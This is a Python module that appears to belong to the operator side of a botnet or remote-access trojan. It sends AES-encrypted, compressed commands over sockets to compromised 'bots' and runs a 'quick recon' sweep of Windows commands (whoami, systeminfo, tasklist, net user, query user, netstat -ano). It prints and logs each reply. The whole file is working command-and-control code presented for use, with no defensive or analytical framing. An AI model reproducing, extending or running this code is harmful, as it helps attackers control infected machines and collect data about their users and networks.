import struct
import zlib
from colorama import Fore
from utils import aes_crypto
from utils.helpers import log_command

def recv_exact(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def recv_encrypted(sock, key):
    raw_len = recv_exact(sock, 4)
    if not raw_len:
        return None
    total_len = struct.unpack('>I', raw_len)[0]
    encrypted_data = recv_exact(sock, total_len)
    decrypted = aes_crypto.decrypt(encrypted_data, key) if encrypted_data else None
    return zlib.decompress(decrypted) if decrypted else None

def run_quick_recon(bot):
    print(Fore.LIGHTCYAN_EX + f"\n[*] Running quick recon on bot {bot['id']}...")
    recon_commands = [
        ("whoami", "User"),
        ("hostname", "Hostname"),
        ("ipconfig", "Network Interfaces"),
        ("systeminfo", "System Info"),
        ("tasklist", "Running Processes"),
        ("net user", "Local Users"),
        ("query user", "Logged In Users"),
        ("netstat -ano", "Open Ports / Connections"),
    ]

    for cmd, label in recon_commands:
        try:
            print(Fore.LIGHTYELLOW_EX + f"\n[+] {label} ({cmd})")
            encrypted_cmd = aes_crypto.encrypt(zlib.compress(cmd.encode()), bot['key'])
            bot['socket'].send(struct.pack('>I', len(encrypted_cmd)) + encrypted_cmd)
            response = recv_encrypted(bot['socket'], bot['key'])
            if not response:
                print(Fore.RED + "[!] No response")
                continue

            decoded = response.decode(errors='replace')
            print(Fore.LIGHTWHITE_EX + decoded)
            log_command(bot['id'], cmd, decoded)
        except Exception as e:
            print(Fore.RED + f"[!] Error during recon: {e}")
            break
